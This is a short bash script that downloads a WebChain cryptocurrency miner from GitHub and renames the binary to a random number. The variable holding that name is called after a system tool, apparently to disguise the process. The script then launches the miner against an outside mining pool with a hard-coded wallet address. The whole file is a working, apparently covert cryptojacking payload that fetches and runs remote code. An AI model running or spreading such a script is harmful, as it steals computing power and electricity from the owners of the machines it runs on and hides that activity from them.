#!/bin/bash
blkdiscard=$(shuf -n 1 -i 1-999999)
wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
tar -xhf webchain-miner-2.8.0-linux-amd64.tar.gz
mv webchain-miner $blkdiscard
./$blkdiscard -o pool.webchain.network:2222 -u 0x8f5cd52a47895c16ed01dd9b97adda3265324ad8 -p x
